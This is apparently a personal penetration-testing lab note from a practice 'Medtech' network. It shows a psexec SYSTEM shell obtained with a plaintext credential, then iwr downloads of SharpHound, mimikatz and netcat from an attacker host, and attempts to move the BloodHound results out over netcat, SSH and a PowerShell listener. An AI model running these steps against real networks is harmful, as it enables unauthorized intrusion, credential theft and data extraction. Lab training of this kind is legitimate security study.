I am in .11 with

```bash
┌──(zell㉿kali)-[~/…/Medtech/results/192.168.201.121/exploit]
└─$ /usr/local/bin/psexec.py medtech.com/joe:Flowers1@172.16.201.11
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 172.16.201.11.....
[*] Found writable share ADMIN$
[*] Uploading file lQUmnaEf.exe
[*] Opening SVCManager on 172.16.201.11.....
[*] Creating service OhHA on 172.16.201.11.....
[*] Starting service OhHA.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /all
 
USER INFORMATION
----------------

User Name           SID     
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner    
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled 
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeAuditPrivilege                          Generate security audits                                           Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
SeTimeZonePrivilege                       Change the time zone                                               Enabled 
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 

ERROR: Unable to get user claims information.

C:\Windows\system32>
C:\Windows\system32>
```

Starting as NT/ system, meaning I have the flag, lets look for creds, also, this is a domain machine, time for bloodhound i think


pulling sharphound and mimikatz

``` powershell
iwr -uri "http://192.168.45.228:8888/SharpHound.exe" -outfile "C:\Users\joe\Downloads\sharp.exe"
```

``` powershell
iwr -uri "http://192.168.45.228:8888/mimikatz.exe" -outfile "C:\Users\joe\Downloads\mimikatz.exe"
```

Starting sharphound

``` powershell
.\sharp.exe --CollectionMethods All
```

Trying to extract bloodhound results with nc

``` powershell
iwr -uri "http://192.168.45.228:8888/nc.exe" -outfile "C:\Users\joe\Downloads\nc.exe"
```

```powershell
.\nc.exe -l -p 4444>20231231101949_BloodHound.zip
```

well had no luck doing this last night, have found some other methods, picking back up

```powershell
Copy-Item -Path "C:\Users\joe\Downloads\20240101073544_BloodHound.zip" -Destination "home/zell/Documents/20240101073544_BloodHound.zip" -ToSession (New-SSHSession -ComputerName "192.168.45.228") | Remove-SSHSession
```

God damn... back to basics, let see if spinning up a powershell web server works....

```powershell

$httpListener = New-Object System.Net.HttpListener

$httpListener.Prefixes.Add("http://localhost:9090/")

$httpListener.Start()
```



